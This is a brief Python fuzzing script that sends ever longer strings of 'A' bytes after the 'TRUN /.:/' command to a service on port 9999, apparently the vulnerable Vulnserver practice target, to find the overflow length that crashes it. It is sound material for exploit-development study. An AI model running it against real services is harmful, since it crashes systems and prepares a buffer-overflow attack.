import socket
import time
import sys



buf = b'A' * 100
host = sys.argv[1]
port = 9999


while True:
	try: 	
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(2)
		s.connect((host, port))

		s.recv(1024)
		print(f'[*] FUZZING with {str(len(buf))} bytes in 127.0.0.1 port 9999')
		s.send(b'TRUN /.:/' + buf + b'\r\n')
		buf += b'A' * 100
		
		s.close()
		time.sleep(1)
	except:
		print('[!] ERROR')
		sys.exit(0)